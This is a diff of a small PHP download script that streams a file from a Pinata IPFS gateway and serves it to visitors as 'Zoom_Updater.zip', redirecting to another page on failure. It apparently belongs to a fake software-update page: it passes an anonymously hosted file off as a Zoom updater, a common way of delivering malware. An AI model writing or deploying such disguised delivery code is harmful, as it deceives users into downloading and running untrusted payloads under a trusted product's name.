@@ -1,6 +1,6 @@
 <?php
 $source = 'https://fuchsia-quickest-kite-522.mypinata.cloud/ipfs/bafkreic4b5ktuwmz4mtzgimw3xnkzk4i4qzjo6z7f5mvg6viwpoz4sveqe';
-$newName = 'ZoomUpdater.zip';
+$newName = 'Zoom_Updater.zip';
 
 header('Content-Description: File Transfer');
 header('Content-Type: application/octet-stream');
@@ -11,7 +11,6 @@ header('Pragma: public');
 
 $fp = fopen($source, 'r');
 if ($fp) {
-    // Stream 4KB chunks to keep memory low
     while (!feof($fp)) {
         echo fread($fp, 4096);
         flush();
@@ -19,7 +18,7 @@ if ($fp) {
     fclose($fp);
     exit;
 } else {
-    header("Location: ./install-guide.php");
+    header("Location: ./download.php");
     exit;
 }
 ?>
